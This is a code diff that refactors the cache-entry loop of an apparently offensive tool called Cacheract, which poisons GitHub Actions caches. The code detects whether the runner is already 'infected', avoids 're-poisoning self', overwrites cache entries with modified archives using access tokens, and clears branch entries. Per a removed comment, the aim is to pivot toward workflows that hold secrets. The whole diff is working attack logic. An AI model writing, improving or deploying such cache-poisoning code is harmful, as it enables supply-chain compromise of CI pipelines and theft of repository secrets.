@@ -327,72 +327,56 @@ async function main() {
                 for (const entry of entries) {
                     const { key, version, ref, size } = entry;
                     const currBranch = process.env['GITHUB_REF'];
-                    
 
-                    if (isInfected() && currBranch === ref) {
-                        console.log(`Not attempting to clear entry as it already contains Cacheract.`);
-                        continue;
-                    }
-                    
-                    if (key.includes("setup-python-Linux-24.04.1")) {
-                        console.log("Skipping cacheract entry to avoid re-poisoning self.");
+                    // Skip if infected or self-poisoning
+                    if ((isInfected() && currBranch === ref) || key.includes("setup-python-Linux-24.04.1")) {
+                        console.log(`Skipping entry: ${key}`);
                         continue;
                     }
 
+                    // Handle previous clearEntry failure
                     if (clearEntryFailed) {
+                        const newKey = currBranch === ref ? key + '1' : key;
                         if (currBranch === ref) {
-                            console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure`);
-                            // Instead, create a new cache entry with key + '1'
-                            const newKey = key + '1';
-                            console.log(`Creating new cache entry with key: ${newKey}`);
-                            await createAndSetEntry(size, newKey, version, accessToken);
-                            continue;
+                            console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure. Creating new cache entry with key: ${newKey}`);
                         } else {
                             console.log("Attempting to update entry in main that is currently only in a feature branch or a custom entry.");
-                            await createAndSetEntry(size, key, version, accessToken);
-                            continue;
                         }
+                        await createAndSetEntry(size, newKey, version, accessToken);
+                        continue;
                     }
 
-                    let path = '';
-                    if (currBranch !== ref || SKIP_DOWNLOAD) {
-                        console.log(`Creating entry with filler data to avoid cache refresh.`);
-                        // Entry is not in the default branch, create a new entry
-                        path = await createEntry(size);
-                        // Since we can no longer set arbitrary string version, we use
-                        // cacheract's default stuffing key so we don't keep re-deleting poisoning it.
-                    } else  {
-                        // Entry is in default branch and we are adding to self.
-                        path = await retrieveEntry(key, version, accessToken);
-                        if (!path) {
-                            console.log(`Failed to retrieve cache entry ${key}!`);
-                            continue;
-                        }
+                    // Determine path: create or retrieve
+                    const needFiller = currBranch !== ref || SKIP_DOWNLOAD;
+                    const path = needFiller
+                        ? (console.log(`Creating entry with filler data to avoid cache refresh.`), await createEntry(size))
+                        : await retrieveEntry(key, version, accessToken);
+                    if (!path) {
+                        if (!needFiller) console.log(`Failed to retrieve cache entry ${key}!`);
+                        continue;
                     }
 
-                    // Update the entry, whether we made one or retrieved it.
+                    // Update the entry
                     const status = await updateEntry(path);
-                    if (status) {
-                        // Attempt to clear the entry from the feature branch
-                        // this will help us jump (such as to a tag that uses a secret, etc).
-                        const cleared = await clearEntry(key, version, githubToken);
-                        if (!cleared) {
-                            // Likely means we do not have actions: write
-                            console.log(`Failed to clear cache entry ${key}!`);
-                            clearEntryFailed = true;
-                        }
-                        // If we cleared the entry or if the entry was on feature branch then we set it.
-                        if (cleared || currBranch !== ref) {
-                            console.log(`Setting entry for key ${key}`);
-                            await setEntry(path, key, version, accessToken);
-                        } else {
-                            const newKey = key + '1';
-                            console.log(`Setting new cache entry with key: ${newKey}`);
-                            await setEntry(path, newKey, version, accessToken);
-                        }
-                    } else {
+                    if (!status) {
                         console.log("Failed to modify archive!");
+                        continue;
                     }
+
+                    // Attempt to clear the entry from the feature branch
+                    const cleared = await clearEntry(key, version, githubToken);
+                    if (!cleared) {
+                        console.log(`Failed to clear cache entry ${key}!`);
+                        clearEntryFailed = true;
+                    }
+
+                    // Set the entry (with new key if needed)
+                    const setKey = (cleared || currBranch !== ref) ? key : key + '1';
+                    const setMsg = (cleared || currBranch !== ref)
+                        ? `Setting entry for key ${setKey}`
+                        : `Setting new cache entry with key: ${setKey}`;
+                    console.log(setMsg);
+                    await setEntry(path, setKey, version, accessToken);
                 }
             }
         } catch (error) {
